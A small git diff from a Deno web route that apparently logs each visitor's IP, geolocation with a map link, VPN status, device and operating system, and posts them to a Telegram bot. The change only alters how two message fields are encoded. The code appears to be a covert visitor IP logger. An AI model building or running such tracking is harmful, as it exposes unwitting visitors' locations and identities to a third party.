@@ -15,8 +15,8 @@ router.get("/", async (ctx) => {
   const info = await ipapi(`${ip}`);
   const bot = `https://api.telegram.org/bot${Deno.env.get("TOKEN")}/sendMessage`
   const countryinfo = `**COUNTRY** : \`${info.country}\`` + await getEmojiByName(`flag-${info.countryCode}`.toLowerCase());
-  const cityInfo = encodeURIComponent(`**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`);
-  const iptext = encodeURIComponent(`**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`);
+  const cityInfo = `**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`
+  const iptext = `**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`
   const vpn = encodeURIComponent(`**VPN** : \`${info.proxy}\``);
   const device_v = encodeURIComponent(`**DEVICE** : ${device.type}`);
   const device_os = encodeURIComponent(`**SYSTEM** : ${os.name}`);
